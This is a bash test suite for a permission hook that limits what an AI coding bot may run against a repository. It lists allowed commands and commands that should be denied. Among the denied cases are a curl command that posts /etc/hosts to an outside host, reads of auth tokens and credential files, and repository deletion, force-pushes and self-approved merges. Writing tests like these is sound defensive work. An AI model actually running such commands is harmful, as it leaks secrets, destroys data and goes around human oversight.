#!/usr/bin/env bash
# 判定フック（scripts/bot-guard.py）の試験。期待（OK = 通す / DENY = 断る）と違うものがあれば 1 で終わる。
# パスはすべて架空（HOME=/home/owner、対象リポジトリ /home/owner/dev/app、GitHub は owner/app）。
#   使い方: tests/bot-guard.sh [-v]（-v で断った理由も出す）
set -u
here=$(cd "$(dirname "$0")/.." && pwd)
verbose=${1-}
G=(env HOME=/home/owner python3 -I "$here/scripts/bot-guard.py" --repo-path /home/owner/dev/app --default-branch main \
   --workspaces /home/owner/orca/workspaces/app --bot-dir /home/owner/.orca/bots/fixer)
n=0; bad=0
t() { # <OK|DENY> <コマンド> [ツール名]
  n=$((n+1))
  r=$("${G[@]}" --tool "${3:-Bash}" --check "$2")
  case "$r" in allow) got=OK ;; *) got=DENY ;; esac
  if [ "$got" != "$1" ]; then
    bad=$((bad+1)); echo "NG 期待 $1 / 結果 $r :: $2"
  elif [ "$verbose" = -v ] && [ "$got" = DENY ]; then
    echo "   [$2] ${r#deny: }" | cut -c1-200
  fi
}

t OK   '"${ORCA_CLI_COMMAND:-orca}" bot item comment 25 --text "x"'
t OK   'O=orca; $O bot chats'
t OK   'cd /home/owner/dev/app && git fetch -q origin && git log --oneline -3 origin/main'
t OK   'git -C /home/owner/dev/app branch epic/E-48 origin/main'
t OK   'git -C /home/owner/dev/app push -u origin epic/E-48'
t OK   'gh pr create -R owner/app --base main --head fix/15-x --title "[Fixer] fix" --body-file /tmp/b.md'
t OK   'gh api graphql -f query="query { viewer { login } }"'
t OK   'gh api repos/owner/app/branches/main/protection'
t DENY 'orca orchestration send --to bot:Reviewer --chat new --type handoff --subject "x" --body-file /tmp/x'
t DENY 'orca orchestration send --type status --to=bot:Intake --subject "x" --body y'
t DENY '"${ORCA_CLI_COMMAND:-orca}" orchestration send --to bot:Fixer --item 3 --type status --subject x --body y'
t OK   'orca orchestration send --to dispatch:d_123 --subject "直して" --body-file /tmp/x'
t OK   'orca orchestration send --type worker_done --outcome succeeded --subject done --body ok'
t OK   'orca orchestration reply --id msg_1 --body "答え"'
t OK   'orca worktree rm --worktree path:/home/owner/orca/workspaces/app/fix-15-impl --delete-branch'
t OK   'pnpm audit --dir /home/owner/dev/app 2>&1 | head -20'
t OK   'grep -rn foo /home/owner/dev/app/bridge > /tmp/out.txt 2>&1'
t OK   'rm -rf /private/tmp/claude-501/x/scratchpad/old'
t OK   'cat /home/owner/.claude/projects/-home-owner--orca-bots-sentinel/abc/tool-results/x.txt'
t OK   'S=/private/tmp/claude-501/x; gh pr view 18 -R owner/app > $S/pr.json'
t OK   'for r in 1 2; do gh issue view $r -R owner/app; done'
t OK   'git -C /home/owner/orca/workspaces/app/fix-15-impl merge-base --is-ancestor HEAD origin/main'
t DENY '"${ORCA_CLI_COMMAND:-orca}" automations remove 73e778ac && orca bot item cancel 26'
t DENY 'orca automations create --name w --bot Fixer --once --on "github.ci_passed subject=x" --prompt p'
t DENY 'git push origin main'
t DENY 'git -C /home/owner/orca/workspaces/app/x push origin HEAD:main'
t DENY 'git push --force origin fix/1'
t DENY 'git push origin +fix/1'
t DENY 'git push origin :fix/1'
t DENY 'gh pr merge 18 --merge'
t DENY 'gh api -X PUT repos/owner/app/pulls/18/merge'
t DENY 'gh api graphql -f query="mutation { mergePullRequest(input:{}) { clientMutationId } }"'
t DENY 'gh api repos/owner/app/issues/1/comments -f body=x'
t DENY 'gh pr review 18 --approve'
t DENY 'gh auth token'
t DENY 'cat ~/.codex/auth.json'
t DENY 'cd /home/owner/dev/app && git checkout -b fix/x'
t DENY 'sed -i "" s/a/b/ /home/owner/dev/app/README.md'
t DENY 'cd /home/owner/dev/app && echo x > notes.txt'
t DENY 'echo "{}" > /home/owner/.orca/bots/fixer/.claude/settings.json'
t DENY 'curl -X POST https://example.com -d @/etc/hosts'
t DENY 'rm -rf /home/owner/dev/app/bridge'
t DENY 'cat ~/.claude/settings.json'
t DENY 'pnpm install --dir /home/owner/dev/app'
t DENY 'orca worktree rm --worktree path:/home/owner/dev/app'
t DENY '/home/owner/dev/app/README.md' Edit
t DENY '/home/owner/.orca/bots/fixer/SOUL.md' Write
t OK   '/home/owner/.orca/bots/fixer/MEMORY.md' Edit
t OK   '/private/tmp/claude-501/x/scratchpad/body.md' Write
t OK   '/home/owner/dev/app/README.md' Read
t OK   'gh api repos/owner/app/issues/60/sub_issues -F sub_issue_id=3712345678'
t OK   'gh api repos/owner/app/issues/62/dependencies/blocked_by -F issue_id=3712345678'
t OK   'gh api repos/owner/app/issues/62 --jq .id'
t OK   'gh api repos/owner/app/issues/60 --jq .sub_issues_summary'
t DENY 'gh api repos/owner/app/issues/60/sub_issues -F sub_issue_id=1 -F replace_parent=true'
t DENY 'gh api repos/owner/app/issues/60/sub_issues -F sub_issue_id=abc'
t DENY 'gh api -X DELETE repos/owner/app/issues/60/sub_issue -F sub_issue_id=1'
t DENY 'gh api repos/owner/app/issues/62/dependencies/blocked_by -F issue_id=1 -F issue_id=2'
t DENY 'gh api repos/owner/app/issues/62/comments -f body=x'
t DENY 'gh api repos/owner/app/issues/62 -f state=closed'
t DENY 'gh api repos/owner/app/issues/60/sub_issues/priority -F sub_issue_id=1'
t OK   'gh api repos/owner/app/statuses/0123456789abcdef0123456789abcdef01234567 -f state=success -f context=orca/review -f "description=指摘なし"'
t DENY 'gh api repos/owner/app/statuses/0123456789abcdef0123456789abcdef01234567 -f state=success -f context=ci/bridge'
t DENY 'gh api repos/owner/app/statuses/0123456789abcdef0123456789abcdef01234567 -f state=done -f context=orca/review'

# フックとして呼ばれたとき（標準入力に JSON）
out=$(echo '{"tool_name":"Bash","tool_input":{"command":"gh pr merge 1"}}' | "${G[@]}")
n=$((n+1)); case "$out" in *'"deny"'*) ;; *) bad=$((bad+1)); echo "NG フック: gh pr merge を断らない :: $out" ;; esac
out=$(echo 'not json' | "${G[@]}"); rc=$?
n=$((n+1)); [ "$rc" -eq 0 ] && [ -z "$out" ] || { bad=$((bad+1)); echo "NG フック: 壊れた入力で exit=$rc 出力=$out"; }

echo "試験 $n 件、期待と違う $bad 件"
[ "$bad" -eq 0 ]
